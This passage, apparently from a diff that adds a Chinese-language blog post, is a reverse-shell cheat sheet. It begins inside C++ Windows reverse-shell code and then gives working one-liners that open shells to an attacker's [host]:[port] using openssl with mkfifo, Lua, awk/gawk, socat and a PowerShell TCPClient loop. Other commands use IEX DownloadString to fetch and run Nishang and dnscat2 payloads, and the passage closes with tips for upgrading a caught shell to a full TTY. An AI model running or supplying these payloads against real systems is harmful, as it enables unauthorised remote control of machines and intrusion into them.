class="comment">//初始化结构体</span></span><br><span class="line">                ini_processo.cb = <span class="built_in">sizeof</span>(ini_processo);</span><br><span class="line">                ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; <span class="comment">// 重定向，隐藏窗口</span></span><br><span class="line">                <span class="comment">// 将标准输入、输出、错误重定向到socket句柄</span></span><br><span class="line">                ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;</span><br><span class="line"></span><br><span class="line">                TCHAR cmd[<span class="number">255</span>] = <span class="built_in">TEXT</span>(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="built_in">CreateProcess</span>(<span class="literal">NULL</span>, cmd, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;ini_processo, &amp;processo_info);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            err = <span class="built_in">closesocket</span>((SOCKET)Winsock);</span><br><span class="line">            <span class="keyword">if</span>(err == SOCKET_ERROR)&#123;</span><br><span class="line">                <span class="built_in">wprintf</span>(<span class="string">L&quot;closesocket function failed with error: %ld\n&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br><span class="line">                <span class="built_in">WSACleanup</span>();</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">WSACleanup</span>();</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">30000</span>); <span class="comment">//休眠30s</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用如下命令编译：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ reverse_shell_win<span class="selector-class">.cpp</span> -static -lwsock32 -lws2_32 -o reverse_shell_win<span class="selector-class">.exe</span></span><br></pre></td></tr></table></figure>
+
+<p>在攻击机上监听端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8888</span><br></pre></td></tr></table></figure>
+
+<h2 id="openssl（加密反弹shell）"><a href="#openssl（加密反弹shell）" class="headerlink" title="openssl（加密反弹shell）"></a>openssl（加密反弹shell）</h2><p>在计算机网络上，OpenSSL 是一个开放源代码的软件库包，应用程序可以使用这个包来进行安全通信，避免窃听，同时确认另一端连接者的身份。不加密就跟裸奔一样。</p>
+<ol>
+<li><p>首先生成自签名证书，输入的时候默认回车即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes</span><br></pre></td></tr></table></figure>
+
+<p>-newkey rsa:2048选项声明了使用RAS算法生成2048位的私钥。<br>-nodes选项表明我们不使用密码加密私钥。<br>-keyout key.key:生成私钥<br>-out cert.pem：生成pem证书</p>
+</li>
+<li><p>服务端监听8888端口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port 8888</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Linux下使用mkfifo进行反弹shell(使用openssl单向认证)：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect [host]:[port]&gt; /tmp/s; rm /tmp/s</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>openssl单&#x2F;双向认证参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/go_home_look/article/details/107238103">https://blog.csdn.net/go_home_look/article/details/107238103</a></p>
+<p>windows不推荐使用此方法，建议直接写webshell。当然Windows下也是可以的，这里做个参考：</p>
+<ol>
+<li><p>服务端开启两个监听，从 ip:port1 获取命令发送给 cmd.exe执行，然后结果返回到 ip:port2。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port [port1]</span><br><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port [port2]</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>客户端执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl s_client -quiet -connect [host]:[port1] | cmd.exe | openssl s_client -quiet -connect [host]:[port2]</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在服务端的[port1]的窗口发送命令,然后服务端[port2]的窗口会收到执行结果</p>
+</li>
+</ol>
+<h2 id="lua"><a href="#lua" class="headerlink" title="lua"></a>lua</h2><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua -e <span class="string">&quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;ip&#x27;,&#x27;port&#x27;);os.execute(&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua -e <span class="string">&quot;local s=require(&#x27;socket&#x27;);local t=assert(s.tcp());t:connect(&#x27;ip&#x27;,port);while true do local r,x=t:receive();local f=assert(io.popen(r,&#x27;r&#x27;));local b=assert(f:read(&#x27;*a&#x27;));t:send(b);end;f:close();t:close();&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h2><p> awk是一种处理文本文件的语言，是一种解释型的编程语言，可以使用awk来处理反弹的命令。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/mylxsw/growing-up/blob/master/doc/%E4%B8%89%E5%8D%81%E5%88%86%E9%92%9F%E5%AD%A6%E4%BC%9AAWK.md">什么是awk？</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">监听端：</span><br><span class="line">nc -nlvp 1231</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">被监听端：</span><br><span class="line">cp /usr/bin/awk /home/a               </span><br><span class="line">(复制一个awk，一般情况下黑客如果做这一步是为了防止被检测，这一步可以不用做，直接用awk执行也是可以的)</span><br><span class="line">/home/a &#x27;BEGIN&#123;s=&quot;/inet/tcp/0/[host]/[port]&quot;</span><br><span class="line">（BEGIN语句块在程序开始的使用执行，它只执行一次，BEGIN是awk的关键字，这个地方这条和下一条语句是拆开的，也可以合并在一起执行，注意合在一起执行的话，这条语句后面要加分号，比如看方法二，我会合并执行）</span><br><span class="line">for(;s|&amp;getline c;close(c))while (c|getline)print|&amp;s;close(s)&#125;&#x27;</span><br><span class="line">(与其他C系语言一样，awk也有for循环，getline命令表示让awk读取下一行内容，close()函数是内建函数)</span><br></pre></td></tr></table></figure>
+
+<h2 id="gawk"><a href="#gawk" class="headerlink" title="gawk"></a>gawk</h2><p> gawk是GNU所做的awk，之后不断地更新迭代，gawk 包含 awk 的所有功能。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">监听端：</span><br><span class="line">nc -nlvp 1231</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">被监听端:</span><br><span class="line">gawk &#x27;BEGIN&#123;s=&quot;/inet/tcp/0/[host]/[port]&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&#x27;</span><br></pre></td></tr></table></figure>
+
+<h2 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h2><h4 id="tcp"><a href="#tcp" class="headerlink" title="tcp"></a>tcp</h4><p>接收端输入：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./socat TCP-LISTEN:ip -</span><br></pre></td></tr></table></figure>
+
+<p>发送端输入：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:ip:port</span><br></pre></td></tr></table></figure>
+
+<h4 id="udp"><a href="#udp" class="headerlink" title="udp"></a>udp</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat udp-connect:攻击者ip:端口 exec:&#x27;bash -li&#x27;,pty,stderr,sane 2&gt;&amp;1&gt;/dev/null &amp;</span><br></pre></td></tr></table></figure>
+
+<h2 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.msconsole      管理生成的exp  管理反弹的shell  通过反弹的shell进行后渗透。。。。</span><br><span class="line">2.msfvenom       制作木马</span><br><span class="line">3.msfencode      对木马进行编码</span><br><span class="line">4.Auxiliary      辅助模块</span><br><span class="line">5.meterpreter    连接 </span><br></pre></td></tr></table></figure>
+
+<h2 id="Cobalt-strike"><a href="#Cobalt-strike" class="headerlink" title="Cobalt strike"></a>Cobalt strike</h2><p>这个就不用多说了</p>
+<h2 id="Nishang反弹shell"><a href="#Nishang反弹shell" class="headerlink" title="Nishang反弹shell"></a>Nishang反弹shell</h2><p><a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang">Nishang</a>是一个基于PowerShell的攻击框架，集合了一些PowerShell攻击脚本和有效载荷，可反弹TCP&#x2F; UDP&#x2F; HTTP&#x2F;HTTPS&#x2F; ICMP等类型shell</p>
+<h4 id="Reverse-TCP-Shell"><a href="#Reverse-TCP-Shell" class="headerlink" title="Reverse TCP Shell"></a>Reverse TCP Shell</h4><ul>
+<li>攻击机：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp [port]</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>目标机：</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;https://raw.githubusercontent.com</span></span><br><span class="line"><span class="string">/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1&#x27;</span>);<span class="built_in">Invoke-PowerShellTcp</span> <span class="literal">-Reverse</span> <span class="literal">-IPAddress</span> [<span class="type">hots</span>] <span class="literal">-port</span> [<span class="type">port</span>]</span><br></pre></td></tr></table></figure>
+
+<p>或者将nishang下载到攻击者本地然后攻击者开一个http服务：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://[host]/nishang/Shells/Invoke-PowerShellTcp.ps1&#x27;</span>);<span class="built_in">Invoke-PowerShellTcp</span> <span class="literal">-Reverse</span> <span class="literal">-IPAddress</span> [<span class="type">host</span>] <span class="literal">-port</span> [<span class="type">port</span>]</span><br></pre></td></tr></table></figure>
+
+<h4 id="Reverse-UDP-Shell"><a href="#Reverse-UDP-Shell" class="headerlink" title="Reverse UDP Shell"></a>Reverse UDP Shell</h4><ul>
+<li><p>攻击者开启监听：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvup [port]</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>目标机：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://[host]/nishang/Shells/Invoke-PowerShellUdp.ps1&#x27;</span>);</span><br><span class="line"><span class="built_in">Invoke-PowerShellUdp</span> <span class="literal">-Reverse</span> <span class="literal">-IPAddress</span> [<span class="type">host</span>] <span class="literal">-port</span> [<span class="type">port</span>]</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="Reverse-ICMP-Shell"><a href="#Reverse-ICMP-Shell" class="headerlink" title="Reverse ICMP Shell"></a>Reverse ICMP Shell</h4><p>需要利用<a target="_blank" rel="noopener" href="https://github.com/inquisb/icmpsh">icmpsh_m.py</a>和nishang中的Invoke-PowerShellIcmp.ps1 来反弹ICMP shell。</p>
+<ul>
+<li><p>首先攻击端下载icmpsh_m.py文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">icmpsh_m.py Usage：</span><br><span class="line">python icmpsh_m.py [Attacker IP] [Victim IP]</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>攻击者执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1 #忽略所有icmp包</span><br><span class="line">python icmpsh_m.py [Attacker IP] [Victim IP] #开启监听</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>目标机执行：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://[host]/nishang/Shells/Invoke-PowerShellIcmp.ps1&#x27;</span>);<span class="built_in">Invoke-PowerShellIcmp</span> <span class="literal">-IPAddress</span> [<span class="type">host</span>]</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="自定义powershell函数反弹shell"><a href="#自定义powershell函数反弹shell" class="headerlink" title="自定义powershell函数反弹shell"></a>自定义powershell函数反弹shell</h2><ul>
+<li><p>攻击机：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp [port]</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>目标机：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-nop</span> <span class="literal">-c</span> <span class="string">&quot;<span class="variable">$client</span> = New-Object Net.Sockets.TCPClient(&#x27;[host]&#x27;,[port]);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();</span></span><br><span class="line"><span class="string">[byte[]]<span class="variable">$bytes</span> = 0..65535|%&#123;0&#125;;while((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, 0, <span class="variable">$bytes</span>.Length)) -ne 0)&#123;;</span></span><br><span class="line"><span class="string"><span class="variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,0, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (iex <span class="variable">$data</span> 2&gt;&amp;1 | Out-String );</span></span><br><span class="line"><span class="string"><span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;<span class="variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="variable">$sendback2</span>);</span></span><br><span class="line"><span class="string"><span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,0,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>或者保存为lltest_tcp.ps1文件</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://[host]/lltest_tcp.ps1&#x27;</span>);<span class="built_in">Invoke-lltestTcp</span></span><br></pre></td></tr></table></figure>
+
+<p>lltest_tcp.ps1 如下：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Invoke-lltestTcp</span></span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$client</span> = <span class="built_in">New-Object</span> Net.Sockets.TCPClient(<span class="string">&#x27;[host]&#x27;</span>,[<span class="type">port</span>])</span><br><span class="line"><span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[<span class="built_in">byte</span>[]]<span class="variable">$bytes</span> = <span class="number">0</span>..<span class="number">65535</span>|%&#123;<span class="number">0</span>&#125;</span><br><span class="line"><span class="keyword">while</span>((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length)) <span class="operator">-ne</span> <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$data</span> = (<span class="built_in">New-Object</span> <span class="literal">-TypeName</span> System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,<span class="number">0</span>, <span class="variable">$i</span>)</span><br><span class="line"><span class="variable">$sendback</span> = (<span class="built_in">iex</span> <span class="variable">$data</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | <span class="built_in">Out-String</span> )</span><br><span class="line"><span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + <span class="string">&#x27;PS &#x27;</span> + (<span class="built_in">pwd</span>).Path + <span class="string">&#x27;&gt; &#x27;</span></span><br><span class="line"><span class="variable">$sendbyte</span> = ([<span class="type">text.encoding</span>]::ASCII).GetBytes(<span class="variable">$sendback2</span>)</span><br><span class="line"><span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,<span class="number">0</span>,<span class="variable">$sendbyte</span>.Length)</span><br><span class="line"><span class="variable">$stream</span>.Flush()</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$client</span>.Close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="dnscat2-反弹DNS-shell"><a href="#dnscat2-反弹DNS-shell" class="headerlink" title="dnscat2 反弹DNS shell"></a>dnscat2 反弹DNS shell</h2><p><a target="_blank" rel="noopener" href="https://github.com/iagox86/dnscat2">dnscat2</a>是一个DNS隧道，旨在通过DNS协议创建加密的命令和控制（C＆C）通道。dnscat2分为两部分：客户端和服务器。dnscat2客户端采用C语言编写，服务器端采用ruby语言编写。后来又有安全研究人员使用PowerShell脚本重写了dnscat2客户端dnscat2-powershell(<a target="_blank" rel="noopener" href="https://github.com/lukebaggett/dnscat2-powershell">https://github.com/lukebaggett/dnscat2-powershell</a>).</p>
+<p>利用dnscat2 和 dnscat2-powershell实现反弹DNS shell:</p>
+<p>- </p>
+<ul>
+<li><p>攻击机：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby dnscat2.rb --dns &quot;domain=lltest.com,host=192.168.159.129&quot; --no-cache -e open</span><br></pre></td></tr></table></figure>
+
+<p>-e open 不使用加密连接，默认使用加密<br>ruby dnscat2.rb —help 查看帮助</p>
+</li>
+<li><p>目标机执行：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> System.Net.Webclient).DownloadString(<span class="string">&#x27;https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1&#x27;</span>);<span class="built_in">Start-Dnscat2</span> <span class="literal">-Domain</span> lltest.com <span class="literal">-DNSServer</span> [<span class="type">host</span>]</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>成功反弹shell后，攻击者：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">session -i 1 #进入到session 1</span><br><span class="line">shell #执行之后会新生成一个session 需要通过session -i 2 切换</span><br><span class="line">session -i 2</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="补充（详情）"><a href="#补充（详情）" class="headerlink" title="补充（详情）"></a>补充（<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/99793">详情</a>）</h2><p>还有一些比较玄学的东西，这里列举一波，可能有点老但是可能会有用，所以这里还是做一个小记录，以备不时之需要。</p>
+<h4 id="Empire-结合office反弹shell"><a href="#Empire-结合office反弹shell" class="headerlink" title="Empire 结合office反弹shell"></a>Empire 结合office反弹shell</h4><p><a target="_blank" rel="noopener" href="https://github.com/EmpireProject/Empire">Empire</a>基于powershell的后渗透攻击框架，可利用office 宏、OLE对象插入批处理文件、HTML应用程序(HTAs)等进行反弹shell</p>
+<h4 id="利用office-OLE对象插入bat文件反弹shell"><a href="#利用office-OLE对象插入bat文件反弹shell" class="headerlink" title="利用office OLE对象插入bat文件反弹shell"></a>利用office OLE对象插入bat文件反弹shell</h4><h4 id="PowerSploit-DLL注入反弹shell"><a href="#PowerSploit-DLL注入反弹shell" class="headerlink" title="PowerSploit DLL注入反弹shell"></a>PowerSploit DLL注入反弹shell</h4><h1 id="实现交互式shell的几种方法"><a href="#实现交互式shell的几种方法" class="headerlink" title="实现交互式shell的几种方法"></a>实现交互式shell的几种方法</h1><p>假设一个情况：如果当前拿到shell之后，我们想要使用vim、su或者想要tab补全代码、ctrl c结束当前行代码、或者使用快捷键使用上一条命令，这个时候这个shell并不会对我们的操作进行响应，那么这个时候就需要升级shell成为交互式完美shell，使其跟我们常规命令行操作一样</p>
+<h2 id="python-pty"><a href="#python-pty" class="headerlink" title="python pty"></a>python pty</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;__import__(&#x27;subprocess&#x27;).call([&#x27;/bin/bash&#x27;])&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>但是当前情况还是不能补全代码，得用stty来进行优化，来转换成完美shell</p>
+<p>在执行完python命令之后，按下Ctrl+z</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Linux 中Ctrl + c/d/z 看着都差不多，但是还是有不一样的含义</span><br><span class="line">Ctrl + c 强制中断程序的执行，进程终止</span><br><span class="line">Ctrl + d 发送EOF信号，很多程序接到这个信号后会停止</span><br><span class="line">Ctrl + z 将任务中止，其实就是将这个任务暂停</span><br></pre></td></tr></table></figure>
+
+<p>按下Ctrl+z之后，nc反弹的shell放入了后台，界面退回到了攻击主机原本的shell</p>
+<ul>
+<li><p><code>echo $TERM</code> 获取 term值</p>
+</li>
+<li><p><code>stty -a</code> 获取 rows 和 columns 的值</p>
+</li>
+<li><p><code>stty raw -echo</code> 关闭输入回显</p>
+</li>
+<li><p><code>fg</code> 进入前台，就是把刚才中止的nc连接捡回来</p>
+</li>
+<li><p><code>reset</code></p>
+</li>
+<li><p><code>export SHELL=bash</code></p>
+</li>
+<li><p><code>export TERM=[前面获取的term值]</code></p>
+</li>
+<li><p><code>stty [前面获取的rows和columns值]</code></p>
+</li>
+</ul>
+<p>这一套在ios系统里面不起作用，但在kali当中时可以完全解决的。</p>
+<h2 id="升级nc为交互shell"><a href="#升级nc为交互shell" class="headerlink" title="升级nc为交互shell"></a>升级nc为交互shell</h2><p>老实话没有什么区别，就上面那样，一样的。</p>
+<h2 id="使用socat"><a href="#使用socat" class="headerlink" title="使用socat"></a>使用socat</h2><p><a target="_blank" rel="noopener" href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat">socat</a>是类Unix系统下的一个工具，可以看作是 nc 的加强版。我们可以使用socat来传递完整的带有tty的TCP连接。缺点也很明显，只能在linux下面运行。</p>
+<p>攻击机：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 首先安装</span><br><span class="line">$ sudo apt install socat</span><br><span class="line"># 执行</span><br><span class="line">$ socat file:`tty`,raw,echo=0 tcp-listen:[port]</span><br></pre></td></tr></table></figure>
+
+<p>目标机：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 把socat上传到目标机器上或者直接下载</span><br><span class="line">$ wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat</span><br><span class="line"># 运行</span><br><span class="line">$ chmod +x /tmp/socat</span><br><span class="line">$ /tmp/socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:[host]:[port]</span><br></pre></td></tr></table></figure>
+
+<p>这种方式基本和ssh类似，ctrl+C也不会直接断开。</p>
+<h2 id="script获取pty"><a href="#script获取pty" class="headerlink" title="script获取pty"></a>script获取pty</h2><p>我们可以使用 Linux 系统下的 <code>script</code> 命令，在弹回来的 shell 下创建一个带有 tty 的 shell, 这样就可以勉强使用一下 <code>top</code> 和 <code>vim</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ script /dev/null</span><br></pre></td></tr></table></figure>
+
+<p>如果不加 <code>/dev/null</code> 的话，会在当前路径下生成一个名字是 <code>typescript</code> 的文件，记录着在 script 生命周期里你执行的所有命令和结果。</p>
+<p>demo:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\</span><br><span class="line">λ nc -lvvp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [192.168.2.134] from DESKTOP-IBUUT6H.lan [192.168.2.134] 30567</span><br><span class="line">ubuntu@ubuntu:~$ <span class="built_in">tty</span></span><br><span class="line"><span class="built_in">tty</span></span><br><span class="line">not a <span class="built_in">tty</span></span><br><span class="line">ubuntu@ubuntu:~$ script /dev/null</span><br><span class="line">script /dev/null</span><br><span class="line">Script started, file is /dev/null</span><br><span class="line">ubuntu@ubuntu:~$ <span class="built_in">tty</span></span><br><span class="line"><span class="built_in">tty</span></span><br><span class="line">/dev/pts/1</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="小知识点总结——关于Linux中-bin-bash和-bin-sh的区别"><a href="#小知识点总结——关于Linux中-bin-bash和-bin-sh的区别" class="headerlink" title="小知识点总结——关于Linux中#!&#x2F;bin&#x2F;bash和#!&#x2F;bin&#x2F;sh的区别"></a>小知识点总结——关于Linux中#!&#x2F;bin&#x2F;bash和#!&#x2F;bin&#x2F;sh的区别</h2><h4 id=""><a href="#" class="headerlink" title="#!"></a>#!</h4><p><code>#!</code>:是一个特殊的表示符，其后，跟着解释此脚本的shell路径。</p>
+<p>除第一行外，脚本中所有以“#”开头的行都是注释。</p>
+<ul>
+<li><p><code>#!/bin/bash</code>或<code>#!/bin/bash</code>只能放在第一行，如果后面还有#!(只要不是在第一行)，那么只能看成是注释。</p>
+<blockquote>
+<p>运行之前需要设置sh的运行权限<code>chmod 777 *</code></p>
+</blockquote>
+</li>
+<li><p>当source命令执行有问题时，bash继续执行下面命令。</p>
+</li>
+<li><p>系统默认的shell是bash。</p>
